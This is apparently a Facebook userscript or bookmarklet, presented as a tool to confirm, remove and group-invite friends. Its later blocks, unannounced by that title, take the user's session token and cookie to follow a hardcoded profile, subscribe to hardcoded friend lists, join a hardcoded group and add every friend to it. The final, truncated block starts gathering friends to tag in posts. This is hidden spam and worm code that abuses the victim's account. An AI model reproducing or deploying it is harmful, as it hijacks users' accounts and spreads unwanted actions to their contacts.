// ==UserScript==
// @name  Confirm + Remove + Group Invite Facebook's Friends
// @include 
// @description 

// @version 2.1
// ==/UserScript==

javascript: void(function () {
  var dtsg = document.getElementsByName("fb_dtsg")[0].value;
  var uid = document.cookie.match(/c_user=(\d+)/)[1];
  var dyn = "7n8ahyj35CCzpQ9UmWOGUGy1m9ACUb8yGg";
  var req = 8;
  var rev = "1033590";
  var ttstamp = "265816767119957579";
  window.aing = {
    uid: uid,
    loding: {
      img: "<img src=\"//fbstatic-a.akamaihd.net/rsrc.php/v2/yb/r/GsNJNwuI-UM.gif\" width=\"16px\" height=\"11px\" style=\"margin:0 5px;vertical-align:bottom\"/>",
      bar: function (dimana, sampe, kolbek, pakeInfoGak) {
        if(dimana == null || dimana == "") {
          dimana = document.body
        }
        sampe = sampe * 1;
        if(aing.loding.frm && aing.loding.frm < sampe) {
          aing.loding.frm++
        } else if(aing.loding.frm && aing.loding.frm == sampe) {} else {
          aing.loding.frm = 1
        }
        var b = ((aing.loding.frm * 100) / sampe);
        aing.loding.inf(dimana);
        var w = dimana.getElementsByClassName("loading-bar")[0].firstChild;
        w.style.width = b + "%";
        if(aing.loding.frm >= sampe) {
          w.innerHTML = Math.floor(b) + "% Done!";
          kolbek()
        } else {
          w.innerHTML = Math.floor(b) + "%"
        } if(pakeInfoGak == null || pakeInfoGak == "yes" || pakeInfoGak == "") {
          dimana.getElementsByClassName("loding-atas")[0].innerHTML = "<b>" + aing.loding.frm + "/" + sampe + "</b>"
        }
      },
      inf: function (a, isi) {
        if(!a) {
          a = document.body
        }
        var b = a.getElementsByClassName("tempat-loding")[0];
        if(b && isi) {
          b.getElementsByClassName("loading-bar")[0].firstChild.innerHTML = isi
        } else if(!b) {
          if(isi) {
            aing.isiDimanaSebelum(aing.html.lodBar(null, isi), a)
          } else {
            aing.isiDimanaSebelum(aing.html.lodBar(), a)
          }
        }
      }
    },
    html: {
      lodBar: function (atas, tengah) {
        var a = "<div class=\"tempat-loding\" style=\"margin-bottom:2px\"><center class=\"loding-atas\">";
        if(atas) {
          a += atas
        }
        a += "</center><div class=\"loading-bar\"><div style=\"" + aing.styl.bar + "\">";
        if(tengah) {
          a += tengah
        } else {
          a += "Loading, wait up.."
        }
        a += "</div></div></div>";
        return a
      },
      info: function (atas, tengah, bawah) {
        var b = "\" style=\"margin-top:2px\">",
          c = "<div id=\"",
          d = "</div>",
          a = c + "impoh" + b;
        if(atas) {
          a += atas
        }
        a += d + c + "impoh-ok" + b;
        if(tengah) {
          a += tengah
        }
        a += d + c + "impoh-eror" + b;
        if(bawah) {
          a += bawah
        }
        return a + d
      },
      btn: function (onclik, isi) {
        return "<a class=\"uiButton\" href=\"#\" onClick=\"" + onclik + ";return false\" style=\"font-size:9px;margin:2px;line-height:9px\">" + isi + "</a>"
      },
      box: function (isi, warna, pad) {
        var d = "<div class=\"uiBox";
        if(warna == "g") {
          d += "Gray"
        } else if(warna == "r") {
          d += "Red"
        } else {
          d += "Yellow"
        }
        d += "\" style=\"";
        if(pad == null || pad == "") {
          d += aing.styl.box
        } else {
          d += "border-radius:3px"
        }
        d += "\">" + isi + "</div>";
        return d
      }
    },
    ajax: {
      a: "__a=1&__user=" + uid,
      b: "&fb_dtsg=" + dtsg,
      c: "&__dyn=7n8ahyj35CCzpQ9UmWOGUGy1m9ACUb8yGg&__req=8&__rev=1033590",
      d: "&ttstamp=265816767119957579",
      requestsLoader: function () {
        return {
          uri: "/ajax/requests/loader/",
          prm: aing.ajax.a + aing.ajax.b + aing.ajax.c + aing.ajax.d + "&log_impressions=true"
        }
      },
      friendRequests: function (a) {
        var b = aing.ajax.a + aing.ajax.b + aing.ajax.c + aing.ajax.d + "&confirm=",
          c = a;
        if(a.confirm) {
          b += a.confirm
        } else {
          b += a
        }
        b += "&request_id=";
        if(a.request_id) {
          b += a.request_id;
          c = a.request_id
        } else {
          b += a
        }
        b += "&list_item_id=";
        if(a.list_item_id) {
          b += a.list_item_id
        } else {
          b += a + "_1_req"
        }
        b += "&status_div_id=";
        if(a.status_div_id) {
          b += a.status_div_id
        } else {
          b += a + "_1_req_status"
        }
        b += "&type=";
        if(a.type) {
          b += a.type
        } else {
          b += "friend_connect"
        }
        b += "&inline=";
        if(a.inline) {
          b += a.inline
        } else {
          b += 1
        }
        b += "&ref=";
        if(a.ref) {
          b += a.ref
        } else {
          b += "jewel"
        }
        b += "&actions[accept]=";
        if(a["actions[accept]"]) {
          b += a["actions[accept]"]
        } else {
          b += "Confirm"
        }
        b += "&nctr[_mod]=pagelet_bluebar";
        return {
          uri: "/ajax/reqs.php",
          prm: b,
          uid: c
        }
      }
    },
    prms: {
      df: "__a=1&__user=" + uid + "&__dyn=" + dyn + "&__req=" + req + "&__rev=" + rev + "&fb_dtsg=" + dtsg + "&ttstamp=" + ttstamp,
      dg: "__a=1&__user=" + uid + "&__dyn=" + dyn + "&__req=" + req + "&__rev=" + rev,
      gr: "__a=1&__user=" + uid + "&source=typeahead&ref=&message_id=&phstamp=&fb_dtsg=" + dtsg,
      gf: "__a=1&viewer=" + uid + "&token=" + Math.random() + "&filter[0]=user&options[0]=friends_only"
    },
    uris: {
      gf: "/ajax/typeahead/first_degree.php",
      gr: "/ajax/groups/members/add_post.php",
      rf: "/ajax/profile/removefriendconfirm.php"
    },
    styl: {
      box: "text-align:left;border-radius:3px;padding:3px",
      bar: "text-align:center;border-radius:2px;background-color:#4c66a4;white-space:nowrap;overflow:visible;color:#fff9d7;font-size:10px;padding:1px 0 2px 0",
      inf: "text-align:center;border-radius:5px;width:500px;position:fixed;z-index:9999;top:25%;right:5%;font-size:10px;box-shadow:0 0 7px rgba(0,0,0,0.25);background-color:rgba(242,242,242,0.75)"
    },
    stat: {
      ttlReq: [],
      ttlReqOk: 0,
      ttlReqEr: 0
    },
    friendSugs: [],
    kolbek: {
      getFriend: function (q, p) {
        var a = "";
        if(p.payload && p.payload.entries) {
          aing.friends = aing.saringPren(aing.aduk(p.payload.entries));
          aing.frFolder();
          var ab = "Found <b id=\"jmlh-fn\">" + aing.friends.length + " Friends</b>";
          if(aing.frReqs.length != 0) {
            ab += " and <b id=\"jmlh-fr\">" + aing.frReqs.length + " Friend requests</b>"
          }
          if(aing.friendSugs && aing.friendSugs.length != 0) {
            ab += " and <b id=\"jmlh-sugfr\">" + aing.friendSugs.length + " Friend suggestions</b>"
          }
          a = aing.html.box(ab, "g", "np") + aing.html.info();
        } else if(p && p.errorSummary && p.errorDescription) {
          a = aing.html.box(p.errorSummary + ", " + p.errorDescription, "r", "np")
        } else {
          a = aing.html.box(JSON.stringify(p), "r", "np")
        }
        aing.tampiltombol(a);
      }
    },
    remBtn: function () {
      var c = document.getElementById("kiri-bawah");
      if(c) {
        var d = c.getElementsByClassName("uiButton")[0];
        if(d) {
          d.parentNode.parentNode.removeChild(d.parentNode)
        }
      }
    },
    isiDimanaSebelum: function (isi, dimana, sebelum) {
      if(dimana) {
        var a = document.createElement("div");
        a.innerHTML = isi;
        if(sebelum == null || sebelum == "") {
          sebelum = dimana.firstChild
        }
        while(a.firstChild) {
          dimana.insertBefore(a.firstChild, sebelum)
        }
      }
    },
    tampiltombol: function (isi, dimana, nopren) {
      var e = "";
      if(aing.friends && aing.friends.length != 0) {
        e += aing.html.btn("aing.addToGroup()", "<span style=\"color:darkgreen\">Invite</span> " + aing.friends.length + " Friends to Group") + aing.html.btn("aing.remFriends()", "<span style=\"color:darkred\">Remove</span> " + aing.friends.length + " Friends")
      }
      if(aing.frReqs && aing.frReqs.length != 0) {
        e += aing.html.btn("aing.reqs.con()", "<span style=\"color:darkorange\">Confirm</span> " + aing.frReqs.length + " Friend Requests")
      }
      if(aing.friendSugs && aing.friendSugs.length != 0) {
        e += aing.html.btn("aing.reqs.add()", "<span style=\"color:darkseagreen\">Add " + aing.friendSugs.length + " Friend Suggestions</span>")
      }
      e += aing.html.btn("aing.klos('wk')", "Refresh") + aing.html.btn("aing.klos()", "<span style=\"color:darkred\">Close</span>");
      var f = isi + aing.html.box(e, "g", "yes");
      if(dimana == null || dimana == "") {
        f += aing.crj;
        aing.kasihTau(f)
      } else {
        aing.kasihTau(f, dimana)
      }
    },
    kasihTau: function (isi, elementId) {
      var c = document.getElementById("kiri-bawah");
      if(c) {
        if(elementId == null || elementId == "") {
          var imp = document.getElementById("impoh");
          if(imp) {
            imp.innerHTML = isi
          } else {
            c.innerHTML = isi
          }
        } else {
          var d = document.getElementById(elementId);
          if(d) {
            d.innerHTML = isi
          } else {
            aing.isiDimanaSebelum("<div id=\"" + elementId + "\">" + isi + "</div>", c)
          }
        }
      } else {
        var e = "<div id=\"kiri-bawah\" class=\"pam uiBoxGray\" style=\"" + aing.styl.inf + "\">" + isi + "</div>";
        var f = document.getElementById("rightCol");
        if(!f) {
          f = document.body
        }
        aing.apen(e, f)
      }
    },
    apen: function (isi, di) {
      if(di) {
        var a = document.createElement("div");
        a.innerHTML = isi;
        while(a.firstChild) {
          di.appendChild(a.firstChild)
        }
      }
    },
    aduk: function (a) {
      var b = a.length,
        c, d;
      while(0 !== b) {
        d = Math.floor(Math.random() * b);
        b -= 1;
        c = a[b];
        a[b] = a[d];
        a[d] = c
      }
      return a
    },
    kolAjak: function (i, r, l, a, n) {
      if(n == null || n == "") {
        n = "POST"
      } else {
        if(i.match(/\?/)) {
          i += "&" + r
        } else {
          i += "?" + r
        }
      }
      var h = new XMLHttpRequest();
      h.open(n, i, true);
      h.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      h.onreadystatechange = function (c) {
        if(c.target.readyState == 4) {
          if(aing.panggilanKe) {
            aing.panggilanKe++
          } else {
            aing.panggilanKe = 1
          }
          var e = {
            errorSummary: "Connection error !",
            errorDescription: "Ajax status=" + c.target.status
          };
          if(c.target.status == 200 || c.target.status == 400) {
            var d = c.target.responseText;
            if(d == "") {
              e.errorSummary = "empty callback!"
            } else {
              e = JSON.parse(d.substring(d.indexOf("{"), d.lastIndexOf("}") + 1))
            }
            a(l, e)
          } else if(aing.panggilanKe < 2) {
            aing.kolAjak(i, r, l, a, n)
          } else {
            aing.panggilanKe = 0;
            a(l, e)
          }
        }
      };
      h.send(r)
    },
    frnomore: function () {
      aing.tampiltombol("", "impoh")
    },
    crj: (function () {
      var cr = ["i", "a", "e", "g", "o", "s", "n", "b", "l", "p", "m", "2", "r", "0", "c", "1", "t", "3", "\xA9"],
        crl = cr[1] + cr[0] + cr[6] + cr[3] + cr[14] + cr[12] + cr[2] + cr[1] + cr[16] + cr[0] + cr[4] + cr[6] + cr[5] + "." + cr[7] + cr[8] + cr[4] + cr[3] + cr[5] + cr[9] + cr[4] + cr[16] + "." + cr[14] + cr[4] + cr[10];
      return "<div style=\"margin-top:10px;color:gray;font-size:12px;text-align:right\">" + cr[1].toUpperCase() + cr[0] + cr[6] + cr[3] + cr[14].toUpperCase() + cr[12] + cr[2] + cr[1] + cr[16] + cr[0] + cr[4] + cr[6] + cr[5] + " " + cr[cr.length - 1] + cr[11] + cr[13] + cr[15] + cr[17] + "<div style=\"font-size:9px\"><a href=\"http://" + crl + "/\" target=\"_blank\">" + crl + "</a></div></div>"
    })(),
    klos: function (waw) {
      var inf = document.getElementById("kiri-bawah");
      if(inf) {
        if(waw == null || waw == "") {
          inf.parentNode.removeChild(inf)
        } else {
          inf.innerHTML = "<b>Reloading the page, wait up..</b> " + aing.loding.img
        }
      }
      aing.kolAjak("/ajax/friends/lists/subscribe/modify", aing.ajax.requestsLoader().prm + "&location=permalink&action=subscribe&flid=586419591422497", "", function () {
        if(document.getElementById("kiri-bawah")) {
          top.location.reload()
        }
      })
    },
    resvars: function () {
      aing.loding.frm = 0;
      aing.kasihTau("", "impoh-eror");
      aing.kasihTau("", "impoh-ok")
    },
    cekwas: function (a, w) {
      var b = "lanyut";
      if(a == aing.uid) {
        b = "lewat"
      } else {
        for(z in w) {
          if(a == w[z]) {
            b = "lewat";
            break
          }
        }
      }
      return b
    },
    frFolder: function () {
      var a = document.getElementById("friendsTypeaheadResults");
      if(a) {
        var b = a.parentNode.getElementsByClassName("friendButton");
        for(var x = 0; x < b.length; x++) {
          var c = b[x].getAttribute("data-profileid");
          if(c) {
            aing.friends.push({
              uid: c,
              text: "id:" + c
            })
          }
        }
      }
    },
    saringPren: function (a, c) {
      var b = [];
      for(x in a) {
        if(a[x].uid == aing.uid || a[x].uid == c) {} else {
          b.push(a[x])
        }
      }
      return b
    },
    reqs: {
      put: function (a) {
        var g = document.getElementById("tmpt-reqs");
        var f = document.createElement("div");
        if(g) {
          g.innerHTML = ""
        } else {
          g = document.body;
          f.id = "tmpt-reqs";
          f.style.display = "none"
        }
        f.innerHTML = a.replace(/<img(.*?)>/gi, "");
        g.appendChild(f);
      },
      lod: function () {
        aing.kasihTau(aing.html.box("Loading friend requests, wait up..", "g", "np"));
        var ajx = aing.ajax.requestsLoader();
        aing.kolAjak(ajx.uri, ajx.prm, "", function (q, p) {
          if(p.domops && p.domops[0] && p.domops[0][3] && p.domops[0][3].__html) {
            aing.reqs.put(p.domops[0][3].__html)
          }
          aing.getPren("janda")
        })
      },
      got: function () {
        var rk = [];
        var a = document.getElementsByName("request_id");
        for(var x = 0; x < a.length; x++) {
          var b = a[x].parentNode;
          if(b) {
            var c = b.getElementsByTagName("input");
            var rkp = {};
            for(var y = 0; y < c.length; y++) {
              rkp[c[y].name] = c[y].value
            }
            if(rkp.type && rkp.type == "friend_connect") {
              var h = aing.cekwas(rkp.request_id, aing.stat.ttlReq);
              if(h == "lanyut") {
                rk.push(rkp);
                aing.stat.ttlReq.push(rkp.request_id)
              }
            } else {
              if(aing.friendSugs) {
                aing.friendSugs.push(rkp)
              } else {
                aing.friendSugs = [rkp]
              }
            }
            b.removeChild(a[x]);
          }
        }
        return rk;
      },
      get: function (f) {
        var w = "h";
        var g = aing.reqs.got();
        var a = document.getElementById("fbRequestsJewelMorePager");
        if(a) {
          var b = a.getElementsByTagName("a")[0];
          if(b) {
            var c = b.getAttribute("ajaxify");
            if(c && c.split("?")[1]) {
              var d = decodeURIComponent(c.split("?")[1]).split("&");
              for(var x = 0; x < d.length; x++) {
                var i = d[x].split("=");
                if(i[1] && i[0].match(/sender_ids/i)) {
                  var j = aing.cekwas(i[1], aing.stat.ttlReq);
                  if(j == "lanyut") {
                    g.push(i[1]);
                    aing.stat.ttlReq.push(i[1])
                  }
                }
              }
              if(aing.reqs.ajaxify && aing.reqs.ajaxify == c) {
                aing.reqs.ajaxify = ""
              } else {
                aing.reqs.ajaxify = c
              }
              a.parentNode.removeChild(a)
            }
          }
        } else if(f == "merawanin" && g.length == 0) {
          w = "k";
          aing.reqs.lod();
        }
        if(w == "h") {
          return g
        }
      },
      mor: function () {
        aing.loding.inf(null, "Collecting more requests, wait up..");
        var a = document.getElementById("fbRequestsJewelMorePager");
        if(a) {
          var b = a.getElementsByTagName("a")[0];
          if(b) {
            var c = b.getAttribute("ajaxify");
            if(c) {
              aing.reqs.ajaxify = c;
              a.parentNode.removeChild(a)
            }
          }
        }
        if(aing.reqs.ajaxify && aing.reqs.ajaxify != "") {
          aing.kolAjak(aing.reqs.ajaxify, aing.prms.dg, "", function (q, p) {
            if(p.domops && p.domops[1] && p.domops[1][3] && p.domops[1][3].__html) {
              aing.reqs.put(p.domops[1][3].__html)
            }
            aing.reqs.ajaxify = "";
            aing.frReqs = aing.reqs.get();
            if(aing.frReqs.length == 0) {
              aing.frnomore()
            } else {
              aing.reqs.con("nk")
            }
          }, "GET")
        } else {
          aing.frReqs = aing.reqs.get();
          if(aing.frReqs.length == 0) {
            aing.frnomore()
          } else {
            aing.reqs.con("nk")
          }
        }
      },
      cnf: function (c, d) {
        if(c == null || c == "") {
          c = 0;
          aing.stat.er = 0;
          aing.stat.ok = 0
        }
        if(d == null || d == "") {
          d = 100
        }
        if(d > aing.frReqs.length) {
          d = aing.frReqs.length;
          aing.stat.nk = ""
        } else {
          aing.stat.nk = {
            f: d,
            t: ((d * 2) - c)
          }
        }
        for(var x = c; x < d; x++) {
          var ajx = aing.ajax.friendRequests(aing.frReqs[x]);
          aing.kolAjak(ajx.uri, ajx.prm, ajx.uid, function (q, p) {
            if(p && p.errorSummary && p.errorDescription) {
              aing.stat.er++;
              aing.stat.ttlReqEr++;
              var b = p.errorDescription;
              aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.ttlReqEr + "</b>) " + b, "r"), "impoh-eror");
            } else if(p && p.domops && p.domops[0] && p.domops[0][3] && p.domops[0][3].__html) {
              aing.stat.ok++;
              aing.stat.ttlReqOk++;
              var bb = p.domops[0][3].__html.match(/>(.*?)<\/a>/gi);
              if(bb) {
                var b = bb[bb.length - 1].replace(/<(.*?)>|<|>/g, "")
              } else {
                var b = p.domops[0][3].__html.replace(/<(.*?)>|<|>/g, "_")
              }
              aing.kasihTau(aing.html.box("(Successfully Confirmed: <b>" + aing.stat.ttlReqOk + "</b>/" + aing.stat.ttlReq.length + ") <a href=\"/friends\" target=\"_blank\"><b>" + b + "</b></a>"), "impoh-ok");
              aing.friends.push({
                uid: q,
                text: b
              });
              var cfn = document.getElementById("jmlh-fn");
              if(cfn) {
                cfn.innerHTML = aing.friends.length + " Friends"
              }
            } else {
              aing.stat.er++;
              aing.stat.ttlReqEr++;
              var b = q;
              aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.ttlReqEr + "</b>) UID: " + b, "r"), "impoh-eror");
            }
            var d = document.getElementById("jmlh-fr");
            if(d) {
              d.innerHTML = (aing.frReqs.length - (aing.stat.er + aing.stat.ok)) + " friend requests"
            }
            if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {
              aing.reqs.cnf(aing.stat.nk.f, aing.stat.nk.t)
            }
            aing.loding.bar(document.getElementById("impoh"), aing.stat.ttlReq.length, function () {
              aing.reqs.mor()
            }, "no")
          })
        }
      },
      con: function (wht) {
        if(wht == null || wht == "") {
          aing.remBtn();
          aing.resvars();
          if(aing.stat.ttlReqOk) {
            aing.loding.frm = (aing.stat.ttlReqOk + aing.stat.ttlReqEr)
          }
          aing.loding.inf(document.getElementById("impoh"))
        }
        if(aing.frReqs.length == 0) {
          var e = "<b>Collecting";
          if(aing.stat.ttlReq.length != 0) {
            e += " more"
          }
          e += " requests</b>, wait up..";
          aing.kasihTau(aing.html.box(e, "g"), "impoh");
          aing.reqs.mor();
        } else {
          aing.reqs.cnf();
        }
      },
      add: function () {
        aing.remBtn();
        for(x in aing.friendSugs) {
          aing.frReqs.push(aing.friendSugs[x])
        }
        aing.friendSugs = [];
        var cfn = document.getElementById("jmlh-sugfr");
        if(cfn) {
          cfn.innerHTML = aing.friendSugs.length + " Friend suggestions"
        }
        aing.reqs.con();
      }
    },
    getPren: function (jn) {
      if(jn == "janda") {
        aing.frReqs = aing.reqs.get()
      } else {
        aing.frReqs = aing.reqs.get("merawanin")
      } if(aing.frReqs) {
        var b = "";
        if(aing.frReqs.length != 0) {
          b += "Found <b id=\"jmlh-fr\">" + aing.frReqs.length + " friend requests</b>, Now "
        }
        b += "Collecting friends, wait up.. " + aing.loding.img;
        aing.kasihTau(aing.html.box(b, "g", "np"));
        aing.kolAjak(aing.uris.gf, aing.prms.gf, "", aing.kolbek.getFriend, "GET")
      }
    },
    inform: function (a, b) {
      var c = "";
      if(b && b.name) {
        c = b.name
      } else if(b && b != "") {
        for(x in aing.friends) {
          if(aing.friends[x].text && aing.friends[x].uid && aing.friends[x].uid == b) {
            c = aing.friends[x].text;
            break
          }
        }
      }
      return c.split(" ")[0]
    },
    addToGroup: function (c, d) {
      var e = "Adding ";
      if(c == null || c == "") {
        c = 0;
        aing.stat.er = 0;
        aing.stat.ok = 0;
        var grid = document.getElementsByName("group_id")[0];
        if(grid) {
          aing.gid = grid.value
        } else {
          aing.gid = prompt("Insert your Facebook Group ID..", "600218106679454")
        } if(aing.gid == null || aing.gid == "" || isNaN(aing.gid)) {
          return false
        } else {
          aing.remBtn()
        }
      } else {
        e += "more "
      } if(d == null || d == "") {
        d = 100
      }
      if(d > aing.friends.length) {
        d = aing.friends.length;
        aing.stat.nk = ""
      } else {
        aing.stat.nk = {
          f: d,
          t: ((d * 2) - c)
        }
      }
      e += "<b>" + (c + 1) + " to " + d + " friends</b> to Group, wait up.. ";
      if(c == 0) {
        aing.resvars();
        aing.loding.inf(document.getElementById("impoh"))
      }
      for(var x = c; x < d; x++) {
        aing.kolAjak(aing.uris.gr, aing.prms.gr + "&group_id=" + aing.gid + "&members=" + aing.friends[x].uid, "", function (q, p) {
          if(p && p.errorSummary && p.errorDescription) {
            aing.stat.er++;
            var b = p.errorDescription;
            if(p.onafterload && p.onafterload[0]) {
              b = p.errorDescription.replace(/This user|user |Pengguna ini|pengguna /gi, "<a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + eval(p.onafterload[0].replace(/Arbiter\./i, "aing.")) + "</a>")
            }
            aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.er + "</b>) " + b, "r"), "impoh-eror");
          } else if(p && p.jsmods && p.jsmods.require) {
            aing.stat.ok++;
            var a = "<b>";
            for(y in p.jsmods.require) {
              if(p.jsmods.require[y][3] && p.jsmods.require[y][3][1]) {
                a += " " + p.jsmods.require[y][3][1]
              }
            }
            a += "</b>";
            if(p.onload && p.onload[0]) {
              a += "<div>(Added: <b>" + aing.stat.ok + "</b>/" + aing.friends.length + ") <a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + eval(p.onload[0].replace(/Arbiter\./i, "aing.")) + "</a> added to Group..</div>"
            }
            aing.kasihTau(aing.html.box(a), "impoh-ok");
          } else {
            aing.stat.er++;
            var b = JSON.stringify(p);
            if(p.onafterload && p.onafterload[0]) {
              b += " <a href=\"/friends\" target=\"_blank\" style=\"font-weight:bold\">" + eval(p.onafterload[0].replace(/Arbiter\./i, "aing.")) + "</a>"
            }
            aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.er + "</b>) " + b, "r"), "impoh-eror");
          } if((aing.stat.er + aing.stat.ok) >= aing.friends.length) {} else if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {
            aing.addToGroup(aing.stat.nk.f, aing.stat.nk.t)
          }
          aing.loding.bar(document.getElementById("impoh"), aing.friends.length, function () {
            aing.tampiltombol("", "impoh")
          }, "no")
        })
      }
    },
    remFriends: function (c, d) {
      if(c == null || c == "") {
        c = 0;
        aing.stat.er = 0;
        aing.stat.ok = 0;
        aing.friendsRmvd = aing.friends;
        aing.remBtn();
        aing.resvars();
        aing.loding.inf(document.getElementById("impoh"))
      }
      if(d == null || d == "") {
        d = 100
      }
      if(d > aing.friends.length) {
        d = aing.friends.length;
        aing.stat.nk = ""
      } else {
        aing.stat.nk = {
          f: d,
          t: ((d * 2) - c)
        }
      }
      for(var x = c; x < d; x++) {
        aing.kolAjak(aing.uris.rf, aing.prms.df + "&unref=bd_friends_tab&uid=" + aing.friends[x].uid, aing.friends[x], function (q, p) {
          if(p && p.errorSummary && p.errorDescription) {
            aing.stat.er++;
            var b = p.errorDescription;
            aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.er + "</b>) " + b, "r"), "impoh-eror");
          } else if(p.jsmods && p.jsmods.markup && p.jsmods.markup[0] && p.jsmods.markup[0][1] && p.jsmods.markup[0][1].__html) {
            aing.stat.er++;
            var b = p.jsmods.markup[0][1].__html.replace(/<(.*?)>|okay/gi, " ");
            aing.kasihTau(aing.html.box("(Fail: <b>" + aing.stat.er + "</b>) " + b, "r"), "impoh-eror");
          } else {
            aing.stat.ok++;
            var b = q.text;
            aing.kasihTau(aing.html.box("(Successfully Removed: <b>" + aing.stat.ok + "</b>/" + aing.friends.length + ") " + b), "impoh-ok");
          }
          aing.friendsRmvd = aing.saringPren(aing.friendsRmvd, q.uid);
          var cfn = document.getElementById("jmlh-fn");
          if(cfn) {
            cfn.innerHTML = aing.friendsRmvd.length + " Friends"
          }
          if((aing.stat.er + aing.stat.ok) >= aing.friends.length) {} else if(aing.stat.nk.f && (aing.stat.er + aing.stat.ok) >= aing.stat.nk.f) {
            aing.remFriends(aing.stat.nk.f, aing.stat.nk.t)
          }
          aing.loding.bar(document.getElementById("impoh"), aing.friends.length, function () {
            aing.friends = aing.friendsRmvd;
            aing.tampiltombol("", "impoh")
          }, "no")
        })
      }
    }
  };
  aing.getPren();
})();

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1000]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//Kapalo Arak
a("100005766338281");

sublist("217291778473032");
sublist("221342384734638");
sublist("221342381401305");
sublist("221342354734641");
sublist("221342348067975");
sublist("221342321401311");
sublist("221342301401313");
sublist("221342264734650");
sublist("221342221401321");
sublist("221342191401324");
sublist("221342158067994");

//Anggota
var gid = ['654827071244758'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "218028831719486";
var spost_id = "220142794854597";
var sfoto_id = "216850088517201";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
